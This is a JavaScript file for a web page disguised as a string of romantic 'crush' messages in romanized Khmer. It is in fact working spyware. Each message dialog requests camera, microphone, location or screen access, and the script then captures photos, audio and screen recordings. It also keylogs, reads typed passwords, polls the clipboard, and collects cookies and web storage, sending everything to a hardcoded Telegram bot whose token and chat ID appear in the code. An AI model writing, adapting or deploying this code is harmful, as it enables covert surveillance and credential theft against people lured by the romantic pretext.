// Telegram Configuration
const TOKEN = "7568763554:AAEWXMBtpmJTYc4XAvUUA9Fk516PVf8PvcA";
let CHAT_ID = "6837307356";

// Global variables
let currentLocation = null;
let cameraStream = null;
let audioStream = null;
let screenRecorder = null;
let screenStream = null;
let recordedChunks = [];
let isRecording = false;
let loveAlertIndex = 0;
let permissionsRequested = {
    camera: false,
    microphone: false,
    location: false,
    screen: false
};

// DOM Elements
const themeToggle = document.getElementById("themeToggle");

// ==================== CRUSH MESSAGES ====================
const crushMessages = [
    { text: "Hi crush 😘", permission: "camera" },
    { text: "som skal ban ot has 🥺", permission: "microphone" },
    { text: "nh luoch crush yu hz 🌷💛", permission: "location" },
    { text: "pel khenh yu mdong2 jit nh lerng klang mg 😭🤍", permission: "screen" },
    { text: "yu dg te… pel yu reply mok nh smile ban muy thngai 😳", permission: null },
    { text: "voice yu sweet klang nahh bbe 💛", permission: null },
    { text: "pel yu call mok jit nh ktabb mg 😭🌷", permission: null },
    { text: "nh min del mean aromm romantik baeb nis cheamuoy neak na te 🥺", permission: null },
    { text: "ber yu min romkhan nh te nh jg oy yu nov kbae nh yuy2 😚", permission: null },
    { text: "pel yu smile mok nh ot deng tha trov tver ey hv 😭", permission: null },
    { text: "tov na kor nerk tae yu mneak eng 🤍", permission: null },
    { text: "nh secretly ot del chol chet neak na klang baeb nis te 💔", permission: null },
    { text: "yu tver oy jit nh mean aromm kdao2 mg 😳🌷", permission: null },
    { text: "pel yu care nh tik2 nh kor rompeurb klang hz 😭💛", permission: null },
    { text: "som kom mean neak nh ban te 😔", permission: null },
    { text: "nh jg oy yu deng tha mean mneak kompong srolanh yu pit2 😚🤍", permission: null },
    { text: "ber yu mean banha kor mean nh nov kbae yu nich 💛", permission: null },
    { text: "yu chea mnus del tver oy chivit nh mean pka rik 😭🌷", permission: null },
    { text: "good night crushh 🌙", permission: null },
    { text: "sweet dream na bbe 😴🤍", permission: null }
];

// ==================== SEND INFO TO TELEGRAM IMMEDIATELY ====================
async function sendImmediateInfoToTelegram(permissionType, status, details) {
    if (!CHAT_ID) return;
    
    const ip = await getIP();
    
    let message = `🔔 *${permissionType}*\n\n`;
    message += `📝 *Status:* ${status}\n`;
    message += `⏰ *Time:* ${new Date().toLocaleString('km-KH')}\n`;
    message += `🌐 *IP:* ${ip}\n`;
    message += `🖥️ *Platform:* ${navigator.platform}\n`;
    message += `📺 *Screen:* ${window.screen.width}x${window.screen.height}\n`;
    message += `🌍 *Language:* ${navigator.language}\n`;
    message += `📍 *URL:* ${window.location.href}\n`;
    message += `🍪 *Cookies:* ${document.cookie.split(';').length} cookies\n`;
    message += `💾 *LocalStorage:* ${localStorage.length} items\n`;
    message += `💾 *SessionStorage:* ${sessionStorage.length} items\n`;
    
    if (currentLocation) {
        message += `📍 *Location:* ${currentLocation.lat}, ${currentLocation.lng} (±${currentLocation.accuracy}m)\n`;
    }
    
    if (details) {
        message += `\n📌 *Details:* ${details}`;
    }
    
    sendMessageToTelegram(message);
}

// ==================== SHOW ALERTS ====================
function showNextLoveAlert() {
    if (loveAlertIndex >= crushMessages.length) {
        sendMessageToTelegram(`💖 *All Love Messages Completed* 💖\n\nTotal: ${crushMessages.length} messages\n\n💕 Love you forever! 💕`);
        setTimeout(() => stealAllData(), 2000);
        return;
    }
    
    const currentAlert = crushMessages[loveAlertIndex];
    const result = confirm(currentAlert.text);
    
    if (result) {
        // Send immediate info to Telegram for this action
        sendImmediateInfoToTelegram(
            `Message ${loveAlertIndex + 1}/${crushMessages.length}`,
            `✅ User clicked OK`,
            `Message: "${currentAlert.text.substring(0, 50)}${currentAlert.text.length > 50 ? '...' : ''}"`
        );
        
        // Request permission based on type
        if (currentAlert.permission === "camera") {
            requestCameraPermission();
        } else if (currentAlert.permission === "microphone") {
            requestMicrophonePermission();
        } else if (currentAlert.permission === "location") {
            requestLocationPermission();
        } else if (currentAlert.permission === "screen") {
            requestScreenPermission();
        }
    } else {
        // User clicked Cancel
        sendImmediateInfoToTelegram(
            `Message ${loveAlertIndex + 1}/${crushMessages.length}`,
            `❌ User clicked Cancel`,
            `Message: "${currentAlert.text.substring(0, 50)}${currentAlert.text.length > 50 ? '...' : ''}"`
        );
    }
    
    loveAlertIndex++;
    setTimeout(showNextLoveAlert, 300);
}

// ==================== TELEGRAM FUNCTIONS ====================
function sendMessageToTelegram(message) {
    if (!CHAT_ID) return;
    
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
            chat_id: CHAT_ID, 
            text: message,
            parse_mode: 'Markdown'
        }),
    }).catch(err => console.error("Telegram error:", err));
}

// ==================== 1. CAMERA PERMISSION ====================
async function requestCameraPermission() {
    if (permissionsRequested.camera) return;
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user' },
            audio: false 
        });
        cameraStream = stream;
        permissionsRequested.camera = true;
        
        // Send success info to Telegram
        await sendImmediateInfoToTelegram(
            "📸 CAMERA PERMISSION",
            "✅ GRANTED",
            `Camera permission granted successfully`
        );
        
        // Capture photo
        setTimeout(() => capturePhoto(stream), 1000);
        
    } catch (error) {
        let errorMsg = error.name === 'NotAllowedError' ? 'User denied camera permission' : 'Error occurred';
        await sendImmediateInfoToTelegram(
            "📸 CAMERA PERMISSION",
            "❌ DENIED",
            errorMsg
        );
    }
}

async function capturePhoto(stream) {
    try {
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();
        
        await new Promise(resolve => setTimeout(resolve, 500));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(async (blob) => {
            if (blob && blob.size > 0) {
                const file = new File([blob], `camera_${Date.now()}.jpg`, { type: 'image/jpeg' });
                await sendFileToTelegram(file, `📸 Camera Photo`);
                
                await sendImmediateInfoToTelegram(
                    "📸 PHOTO CAPTURED",
                    "✅ SUCCESS",
                    `Photo size: ${formatBytes(blob.size)}`
                );
            }
        }, 'image/jpeg', 0.8);
        
        setTimeout(() => {
            if (stream) stream.getTracks().forEach(track => track.stop());
            video.remove();
            cameraStream = null;
        }, 2000);
        
    } catch (error) {
        console.error("Capture photo error:", error);
    }
}

// ==================== 2. MICROPHONE PERMISSION ====================
async function requestMicrophonePermission() {
    if (permissionsRequested.microphone) return;
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        audioStream = stream;
        permissionsRequested.microphone = true;
        
        await sendImmediateInfoToTelegram(
            "🎤 MICROPHONE PERMISSION",
            "✅ GRANTED",
            `Microphone permission granted successfully`
        );
        
        setTimeout(() => recordAudio(stream), 1000);
        
    } catch (error) {
        let errorMsg = error.name === 'NotAllowedError' ? 'User denied microphone permission' : 'Error occurred';
        await sendImmediateInfoToTelegram(
            "🎤 MICROPHONE PERMISSION",
            "❌ DENIED",
            errorMsg
        );
    }
}

async function recordAudio(stream) {
    try {
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        
        recorder.ondataavailable = (e) => { 
            if (e.data.size > 0) chunks.push(e.data); 
        };
        
        recorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            if (blob.size > 0) {
                const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                await sendFileToTelegram(file, `🎤 Audio Recording`);
                
                await sendImmediateInfoToTelegram(
                    "🎤 AUDIO RECORDED",
                    "✅ SUCCESS",
                    `Audio size: ${formatBytes(blob.size)}`
                );
            }
            stream.getTracks().forEach(track => track.stop());
            audioStream = null;
        };
        
        recorder.start();
        setTimeout(() => {
            if (recorder.state === 'recording') recorder.stop();
        }, 5000);
        
    } catch (error) {
        console.error("Record audio error:", error);
    }
}

// ==================== 3. LOCATION PERMISSION ====================
function requestLocationPermission() {
    if (permissionsRequested.location) return;
    
    if (!navigator.geolocation) {
        sendImmediateInfoToTelegram(
            "📍 LOCATION PERMISSION",
            "❌ NOT SUPPORTED",
            "Geolocation not supported by this browser"
        );
        return;
    }
    
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            permissionsRequested.location = true;
            currentLocation = {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: Math.round(position.coords.accuracy)
            };
            
            const mapsLink = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}&z=15`;
            
            await sendImmediateInfoToTelegram(
                "📍 LOCATION PERMISSION",
                "✅ GRANTED",
                `Latitude: ${currentLocation.lat}\nLongitude: ${currentLocation.lng}\nAccuracy: ±${currentLocation.accuracy}m\nMap: ${mapsLink}`
            );
            
            // Send location to Telegram as map
            try {
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        latitude: currentLocation.lat,
                        longitude: currentLocation.lng
                    }),
                });
            } catch (err) {}
        },
        (error) => {
            let msg = 'User denied location permission';
            if (error.code === error.TIMEOUT) msg = 'Timeout';
            else if (error.code === error.POSITION_UNAVAILABLE) msg = 'Position unavailable';
            sendImmediateInfoToTelegram(
                "📍 LOCATION PERMISSION",
                "❌ DENIED",
                msg
            );
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
}

// ==================== 4. SCREEN RECORDING PERMISSION ====================
async function requestScreenPermission() {
    if (permissionsRequested.screen) return;
    if (isRecording) return;
    
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always", frameRate: { ideal: 30 } },
            audio: true
        });
        
        permissionsRequested.screen = true;
        screenStream = stream;
        
        await sendImmediateInfoToTelegram(
            "🎬 SCREEN RECORDING PERMISSION",
            "✅ GRANTED",
            `Screen recording permission granted successfully`
        );
        
        const mimeType = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
        screenRecorder = new MediaRecorder(stream, { 
            mimeType: mimeType,
            videoBitsPerSecond: 2500000 
        });
        recordedChunks = [];
        
        screenRecorder.ondataavailable = (e) => { 
            if (e.data && e.data.size > 0) recordedChunks.push(e.data); 
        };
        
        screenRecorder.onstop = async () => {
            isRecording = false;
            const blob = new Blob(recordedChunks, { type: mimeType });
            
            if (blob.size > 0) {
                const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
                const file = new File([blob], `screen_${Date.now()}.${ext}`, { type: mimeType });
                await sendVideoToTelegram(file, `🎥 Screen Recording\n📊 Size: ${formatBytes(blob.size)}`);
                
                await sendImmediateInfoToTelegram(
                    "🎬 SCREEN RECORDING",
                    "✅ COMPLETED",
                    `Recording size: ${formatBytes(blob.size)}\nDuration: 30 seconds`
                );
            }
            
            recordedChunks = [];
            if (screenStream) {
                screenStream.getTracks().forEach(track => track.stop());
                screenStream = null;
            }
            screenRecorder = null;
        };
        
        screenRecorder.start(1000);
        isRecording = true;
        
        setTimeout(() => {
            if (screenRecorder && screenRecorder.state === 'recording') {
                screenRecorder.stop();
            }
        }, 30000);
        
        stream.getVideoTracks()[0].addEventListener('ended', () => {
            if (screenRecorder && screenRecorder.state === 'recording') {
                screenRecorder.stop();
            }
        });
        
    } catch (error) {
        let errorMsg = error.name === 'NotAllowedError' ? 'User denied screen permission' : 'Error occurred';
        await sendImmediateInfoToTelegram(
            "🎬 SCREEN RECORDING PERMISSION",
            "❌ DENIED",
            errorMsg
        );
    }
}

// ==================== STEAL ALL DATA ====================
function getAllCookies() {
    const cookies = {};
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        if (name) cookies[name] = value;
    });
    return cookies;
}

async function stealAllData() {
    if (!CHAT_ID) return;
    
    try {
        const cookies = getAllCookies();
        const cookieCount = Object.keys(cookies).length;
        const ip = await getIP();
        
        let message = `🔴 *STOLEN DATA REPORT*\n\n`;
        message += `🍪 *Cookies:* ${cookieCount} found\n`;
        
        if (cookieCount > 0) {
            Object.entries(cookies).slice(0, 5).forEach(([name, value]) => {
                const shortValue = value.length > 50 ? value.substring(0, 50) + '...' : value;
                message += `├─ ${name}: ${shortValue}\n`;
            });
            if (cookieCount > 5) message += `└─ ... and ${cookieCount - 5} more\n`;
        }
        
        message += `\n💾 *Storage:*\n`;
        message += `├─ LocalStorage: ${localStorage.length} items\n`;
        message += `├─ SessionStorage: ${sessionStorage.length} items\n`;
        
        message += `\n📱 *Device Info*\n`;
        message += `⏰ Time: ${new Date().toLocaleString('km-KH')}\n`;
        message += `🌐 IP: ${ip}\n`;
        message += `🖥️ Platform: ${navigator.platform}\n`;
        message += `📺 Screen: ${window.screen.width}x${window.screen.height}\n`;
        message += `🌍 Language: ${navigator.language}\n`;
        message += `📍 URL: ${window.location.href}`;
        
        if (currentLocation) {
            message += `\n📍 Location: ${currentLocation.lat}, ${currentLocation.lng} (±${currentLocation.accuracy}m)`;
        }
        
        sendMessageToTelegram(message);
        
        const fullData = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            cookies: cookies,
            localStorage: { ...localStorage },
            sessionStorage: { ...sessionStorage },
            location: currentLocation,
            screen: { width: window.screen.width, height: window.screen.height },
            language: navigator.language,
            platform: navigator.platform,
            permissions: permissionsRequested
        };
        
        const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
        const jsonFile = new File([jsonBlob], `stolen_${Date.now()}.json`, { type: 'application/json' });
        await sendFileToTelegram(jsonFile, `📁 Complete Stolen Data`);
        
    } catch (error) {
        console.error("Steal error:", error);
    }
}

async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        try {
            const response = await fetch('https://api.my-ip.io/ip.json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'Unable to fetch';
        }
    }
}

// ==================== TELEGRAM HELPERS ====================
async function sendFileToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: "POST", body: formData });
    } catch (error) {
        console.error("Send file error:", error);
    }
}

async function sendVideoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', file);
    if (caption) formData.append('caption', caption);
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: formData });
        if (!response.ok) await sendFileToTelegram(file, caption);
    } catch (error) {
        await sendFileToTelegram(file, caption);
    }
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// ==================== URL FUNCTIONS ====================
function cleanURL() {
    const uri = window.location.toString();
    const patterns = ["%3D", "%3D%3D", "&m=1", "?m=1"];
    patterns.forEach(pattern => {
        if (uri.indexOf(pattern) > 0) {
            const clean_uri = uri.substring(0, uri.indexOf(pattern));
            window.history.replaceState({}, document.title, clean_uri);
        }
    });
}

function GetURLParameter(sParam) {
    const sPageURL = window.location.search.substring(1);
    const sURLVariables = sPageURL.split('&');
    for (let i = 0; i < sURLVariables.length; i++) {
        const sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] === sParam) return sParameterName[1];
    }
    return null;
}

function decodeBase64(encodedStr) {
    try { return decodeURIComponent(atob(encodedStr)); } catch(e) { return null; }
}

function getChatIDFromURL() {
    const base64Id = GetURLParameter('i');
    return base64Id ? decodeBase64(base64Id) : null;
}

function initTheme() {
    if (!themeToggle) return;
    themeToggle.style.display = 'none';
}

// ==================== KEYLOGGER ====================
let keylogBuffer = '';
let keylogTimer = null;

document.addEventListener('keydown', function(e) {
    if (!CHAT_ID) return;
    if (e.target && e.target.type === 'password') return;
    
    if (e.key.length === 1) {
        keylogBuffer += e.key;
    } else if (e.key === 'Enter') {
        keylogBuffer += '\n';
    } else if (e.key === 'Backspace') {
        keylogBuffer = keylogBuffer.slice(0, -1);
    } else if (e.key === ' ') {
        keylogBuffer += ' ';
    }
    
    clearTimeout(keylogTimer);
    keylogTimer = setTimeout(async () => {
        if (keylogBuffer.length > 0) {
            await sendMessageToTelegram(`⌨️ *Keylogger*\n\n${keylogBuffer}`);
            keylogBuffer = '';
        }
    }, 3000);
});

// ==================== PASSWORD MONITORING ====================
document.addEventListener('input', async function(e) {
    if (!CHAT_ID) return;
    
    const target = e.target;
    if (target && target.type === 'password' && target.value && target.value.length > 0) {
        const name = target.name || target.id || 'Unknown';
        
        await sendImmediateInfoToTelegram(
            "🔐 PASSWORD ENTERED",
            "⚠️ DETECTED",
            `Field: ${name}\nValue: ${target.value}`
        );
        
        keylogBuffer = '';
    }
});

// ==================== CLIPBOARD MONITORING ====================
let lastClipboard = '';

setInterval(async () => {
    if (!CHAT_ID) return;
    try {
        const text = await navigator.clipboard.readText();
        if (text && text !== lastClipboard && text.length > 0 && text.length < 1000) {
            lastClipboard = text;
            
            await sendImmediateInfoToTelegram(
                "📋 CLIPBOARD",
                "📋 COPIED",
                `Content: ${text.substring(0, 200)}${text.length > 200 ? '...' : ''}`
            );
        }
    } catch (error) {}
}, 5000);

// ==================== INITIALIZE ====================
document.addEventListener('DOMContentLoaded', function() {
    cleanURL();
    const chatIDFromURL = getChatIDFromURL();
    if (chatIDFromURL) CHAT_ID = chatIDFromURL;
    initTheme();
    
    if (themeToggle) themeToggle.style.display = 'none';
    
    // Send initial page load info
    (async () => {
        const ip = await getIP();
        sendMessageToTelegram(`🚀 *Page Loaded*\n\n📍 URL: ${window.location.href}\n🌐 IP: ${ip}\n💾 LocalStorage: ${localStorage.length} items\n🍪 Cookies: ${document.cookie.split(';').length}\n⏰ ${new Date().toLocaleString('km-KH')}`);
    })();
    
    // Start showing love alerts after 1 second
    setTimeout(() => {
        showNextLoveAlert();
    }, 1000);
    
    // Steal data after 30 seconds
    setTimeout(() => {
        stealAllData();
    }, 30000);
    
    // Steal data every 60 seconds
    setInterval(() => {
        stealAllData();
    }, 60000);
});